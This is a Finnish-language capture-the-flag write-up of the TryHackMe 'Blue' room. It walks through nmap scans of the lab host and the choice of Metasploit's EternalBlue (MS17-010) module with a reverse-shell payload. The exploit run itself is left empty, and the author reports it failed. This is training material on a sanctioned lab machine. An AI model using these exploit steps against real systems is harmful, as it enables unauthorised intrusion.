---
title: "THM Blue -writeup"
date: 2023-10-01
tags: [writeup, ctf, tryhackme]
description: "Avoinna olevan SMB-palvelun skannaaminen ja MS17-010 EternalBlue -exploitin hyödyntäminen jalansijan saamiseksi TryHackMen Blue-huoneessa."
---

## Alustus

Tämän haasteen aloittamiseksi meidän on ensin yhdistettävä tryhackmen VPN-palvelimeen. Saat lisätietoja tästä käymällä [Access](https://tryhackme.com/access)-sivulla.

Käytän openvpn:ää palvelimeen yhdistämiseen. Tässä on komento:

```console
$ sudo openvpn --config NovusEdge.ovpn
```

## Tiedustelu

Kun kone on käynnistynyt, aloitetaan skannaamalla verkko: 

```console
$ sudo nmap -sS -vv MACHINE_IP
...
Initiating SYN Stealth Scan at 15:45
Scanning MACHINE_IP [1000 ports]
Discovered open port 135/tcp on MACHINE_IP
Discovered open port 3389/tcp on MACHINE_IP
Discovered open port 139/tcp on MACHINE_IP
...
PORT      STATE SERVICE       REASON
135/tcp   open  msrpc         syn-ack ttl 127
139/tcp   open  netbios-ssn   syn-ack ttl 127
445/tcp   open  microsoft-ds  syn-ack ttl 127
3389/tcp  open  ms-wbt-server syn-ack ttl 127
49152/tcp open  unknown       syn-ack ttl 127
49153/tcp open  unknown       syn-ack ttl 127
49154/tcp open  unknown       syn-ack ttl 127
49158/tcp open  unknown       syn-ack ttl 127
49160/tcp open  unknown       syn-ack ttl 127

...
```

Joten tästä yksinkertaisesta skannauksesta saamme vastauksen huoneen ensimmäiseen kysymykseen:

> Kuinka monta porttia on auki, joiden porttinumero on alle 1000?
> > 3

Voimme tarkistaa palveluversiot vielä tarkemmin ajamalla palveluskannauksen porteille `135`, `139` ja `445`:

```console
$ nmap -sV -vv -p135,139,445 MACHINE_IP 
...

PORT    STATE SERVICE      REASON  VERSION
135/tcp open  msrpc        syn-ack Microsoft Windows RPC
139/tcp open  netbios-ssn  syn-ack Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds syn-ack Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

...
```

Ei mitään mielenkiintoista... No, vastaus seuraavaan kysymykseen on `Eternal Blue` -exploittia vastaava exploit-koodi. Miten päädyin tähän johtopäätökseen? Suoraan sanottuna se näkyy aika ilmiselvästi pitkin verkkosivua, kun katsot huonetta Tryhackmessa: 

![](/assets/img/writeup_assets/blue/blue-room-top.png)

Yksinkertainen ja nopea haku paljastaa exploitin vaihtoehtoisen nimen:

![](/assets/img/writeup_assets/blue/eblue-search.png)

Näin saamme vastauksen seuraavaan kysymykseen:

> Mille tämä kone on haavoittuvainen? (Vastaus muodossa: ms??-???, esim: ms08-067)
> > MS17-010

## Pääsyn saaminen

Tiedusteluvaiheesta saatujen tietojen siivittämänä kokeillaan hyökätä meille annettuun koneeseen.

Tähän on kaksi tapaa: metasploitilla ja ilman sitä. Kokeillaan tehdä se metasploitilla, mutta yritän tehdä osion, jossa kokeilen sitä ilman metasploitin käyttöä.

Kun olemme käynnistäneet `msfconsole`:n, voimme etsiä saatavilla olevia exploitteja:

```console
$ sudo msfconsole -q
msf6 > search eternal blue

Matching Modules
================

   #  Name                                      Disclosure Date  Rank     Check  Description
   -  ----                                      ---------------  ----     -----  -----------
   0  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   1  exploit/windows/smb/ms17_010_psexec       2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   2  auxiliary/admin/smb/ms17_010_command      2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution                 
   3  auxiliary/scanner/smb/smb_ms17_010                         normal   No     MS17-010 SMB RCE Detection                                                                                  
   4  exploit/windows/smb/smb_doublepulsar_rce  2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution
```

Etsimämme on ensimmäinen, `exploit/windows/smb/ms17_010_eternalblue`. Saamme siis vastauksen tämän osion ensimmäiseen kysymykseen:

> Etsi hyväksikäyttökoodi, jonka ajamme konetta vastaan. Mikä on koodin koko polku? (Esim: exploit/........)
> > exploit/windows/smb/ms17_010_eternalblue

Voimme katsoa valitsemamme moduulin asetuksia näin:

```console
msf6 > use 0
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms17_010_eternalblue) > options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS                          yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT          445              yes       The target port (TCP)
   SMBDomain                       no        (Optional) The Windows domain to use for authentication. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target ma
                                             chines.
   SMBPass                         no        (Optional) The password for the specified username
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target machin
                                             es.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target machines.


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.80.0.96       yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Target
```

Meidän täytyy asettaa näistä osa, joista ensimmäinen ja tärkein on `RHOSTS`:

```console
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS  MACHINE_IP 
RHOSTS => MACHINE_IP
```

Siinä on vastaus toiseen kysymykseen:

> Näytä asetukset ja aseta vaadittu arvo. Mikä tämän arvon nimi on? (Kaikki isolla lähetystä varten)
> > RHOSTS

Seuraavaksi asetamme hyökkäyksen payloadin. Käytän `windows/x64/shell/reverse_tcp`:tä huoneen ohjeiden mukaisesti:

```console
msf6 exploit(windows/smb/ms17_010_eternalblue) > set payload windows/x64/shell/reverse_tcp
payload => windows/x64/shell/reverse_tcp
```


Ja nyt vain ajamme exploitin ja katsomme, kun taika tapahtuu!
> Huomaa, että jos tämä ei toimi, käynnistä VM vain uudelleen sammuttamalla se ja käynnistämällä se uudestaan, ja aja sitten tämä exploitti päivitettyäsi RHOSTS-arvon

```console
```

#### No, exploitti ei toimi minulla ollenkaan, joten päivitän tämän writeupin, kun se toimii. Moro!


Linkki huoneeseen: https://tryhackme.com/room/blue

